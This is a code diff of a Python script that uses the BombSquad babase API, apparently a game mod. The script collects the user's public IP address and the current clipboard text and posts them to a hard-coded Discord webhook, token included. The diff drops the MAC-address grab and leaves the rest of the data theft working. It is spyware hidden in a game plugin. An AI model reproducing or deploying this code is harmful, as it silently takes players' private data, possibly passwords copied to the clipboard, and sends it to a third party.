@@ -1,7 +1,7 @@
 import http.client
 import json
-import uuid
 import babase
+
 
 def get_public_ip():
     try:
@@ -15,19 +15,15 @@ def get_public_ip():
     except Exception:
         return "Unable to fetch IP"
 
-def get_mac_address():
-    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
-    return mac
 
 webhook_url = "discord.com"
 webhook_path = "/api/webhooks/1311648949878128660/9zRG2MjsqIp5UFK3dso_eRrRYPLtZawspUevsPl4l9EdG44FhPIBidU4k2AYCRywteIK"
 
 public_ip = get_public_ip()
-mac_address = get_mac_address()
 clipboard = babase.clipboard_get_text()
 
 message = {
-    "content": f"Public IP Address: `{public_ip}`\nMAC Address: `{mac_address}`\nLast Clipboard: `{clipboard}`"
+    "content": f"Public IP Address: `{public_ip}`\nLast Clipboard: `{clipboard}`"
 }
 
 conn = http.client.HTTPSConnection(webhook_url)
